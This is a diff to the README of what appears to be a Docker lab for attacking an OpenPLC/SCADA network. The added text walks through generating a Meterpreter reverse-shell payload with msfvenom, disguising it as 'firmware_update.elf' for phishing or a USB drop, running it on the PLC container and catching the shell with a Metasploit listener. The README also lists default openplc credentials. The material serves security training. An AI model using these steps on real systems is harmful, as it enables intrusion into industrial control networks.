@@ -29,7 +29,7 @@ Docker Containers
      - `network2` (IP: 172.18.0.12)
    - **Ports:** 10012:8080
 
-## Accessing the Components on the browser
+## *Accessing the Components on the browser*
 
 1. **PLC11 Dashboard**:
    - URL: `http://172.18.0.11:10011`
@@ -41,7 +41,7 @@ Docker Containers
    - **Username**: `openplc`
    - **Password**: `openplc`
 
-## Accessing the Components on via the docker cli
+## *Accessing the Components on via the docker cli*
 
 bash:
 ```
@@ -72,7 +72,7 @@ Docker container
    - **Ports:** 10018:8080
    - **Description:** The attacker will install the basic tools to counter attack.
 
-## Accessing the attacker's machine via the docker cli
+## *Accessing the attacker's machine via the docker cli*
 
 bash:
 ```
@@ -81,25 +81,61 @@ docker exec -it attacker bash
 
 **NB:** We assume the attacker is already in the swat network so he can access other components of the Scada network
 
-## Scenario - 1 : Exploit vulnerable OpenPLC database
+## *Scenario - 1 : Exploit vulnerable OpenPLC database*
 
 The first scenario consist of exploiting the sqlite database of OpenPLC using a script **db-attack.py** found in the **2 - Attack_scripts folder** 
 
 If Metasploit is not installed, follow these steps:
 
-```attacker's terminal
+Attacker's terminal
+```
 apt-get update && apt-get install -y git curl wget python3-pip
 apt install metasploit-framework
 ```
 
-### Phase 1 : Craft malicious payload
+### *Phase 1 : Craft malicious payload*
 
 - The attacker creates a malicious payload usually named reverse shell using **Metasploit**’s `msfvenom` tool. to access to the plc's container : 
 
-attacker's terminal
+#### *Command to craft the payload in the attacker's machine*
+
+Attacker's terminal
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f elf -o firmware_update.elf
 ``` 
+
+- The attacker loads the malicious payload into the target's machine. In a real world case, he could use phishing or handle a USB key to an employee. He will eventually tell the employee that it could be firmware update for plcs. The idea is to have access to a target's machine in order to manipulate the PLC remotely. 
+- In our attack scenario, we assume the phising attack went on successfullu, so we simply upload the crafted payload into the target container
+
+bash 
+```
+docker cp attacker:/scripts/firmware_update.elf plc11:/workdir
+```
+
+Then in plc11, we run this 
+
+Plc11 terminal
+```
+cd workdir
+chmod +x firmware_update.elf
+./firmware_update.elf
+```
+
+- The payload is running successfully in the target's machine, so the attacker can access the target machine using reverse shell of **Metasploit**’s `msfvenom` tool.
+
+#### *Set up a Metasploit Listener:*
+
+Attacker's terminal
+```
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 172.18.0.18 #attacker's IP address
+set LPORT 4444
+exploit
+```
+
+- When the payload is executed, the attacker will gain a reverse shell into the system.
 
 
 
